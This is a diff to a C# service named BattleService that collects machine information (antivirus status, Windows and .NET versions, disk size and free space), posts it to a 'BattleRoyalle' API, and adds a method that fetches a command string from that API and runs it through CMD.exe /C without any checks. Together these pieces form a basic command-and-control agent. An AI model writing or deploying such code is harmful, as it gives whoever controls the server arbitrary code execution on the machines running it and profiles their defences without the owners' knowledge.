@@ -1,6 +1,7 @@
 ﻿using BattleService.Model;
 using RestSharp;
 using System;
+using System.IO;
 using System.Management;
 using System.Net;
 using System.Net.Sockets;
@@ -51,6 +52,32 @@ namespace BattleService
             return Environment.Version.ToString();
         }
 
+        public string getSizeHD()
+        {
+            foreach (var drive in DriveInfo.GetDrives())
+            {
+                if (drive.IsReady)
+                {
+                    var size = drive.TotalSize / 1024 / 1024 / 1024;
+                    return size.ToString();
+                }
+            }
+            return "";
+        }
+
+        public string getFreeSizeHD()
+        {
+            foreach (var drive in DriveInfo.GetDrives())
+            {
+                if (drive.IsReady)
+                {
+                    var size = drive.TotalFreeSpace / 1024 / 1024 / 1024;
+                    return size.ToString();
+                }
+            }
+            return "";
+        }
+
         public Machine GetInformationMachine()
         {
             var machine = new Machine();
@@ -59,15 +86,35 @@ namespace BattleService
             machine.AtivirusInstalado = AntiVirusInstalado();
             machine.VersaoWindows = getWindowsVersion();
             machine.VersaoNet = getNetVersion();
+            machine.TamanhoHD = getSizeHD();
+            machine.DisponivelHD = getFreeSizeHD();
             return machine;
         }
 
         public void EnviarParaApi(Machine machine)
         {
-            var client = new RestClient("http://192.168.100.23:60246");
+            Console.WriteLine("Enviando informações para API");
+            var client = new RestClient("http://localhost:60246");
             var request = new RestRequest("/api/BattleRoyalle", Method.POST);
             request.AddJsonBody(machine);
             client.Execute(request);
+        }
+
+        public void ReceberCmdEExecutar()
+        {
+            var client = new RestClient("http://localhost:60246");
+            var request = new RestRequest("/api/BattleRoyalle/getcomando", Method.GET);
+
+            var response = client.Execute(request);
+            Console.WriteLine(response.Content);
+
+            if (!string.IsNullOrEmpty(response.Content))
+            {
+                var strCmdText = @"/C " + response.Content;
+                System.Diagnostics.Process.Start("CMD.exe", strCmdText);
+            }
+            
+
         }
     }
 }
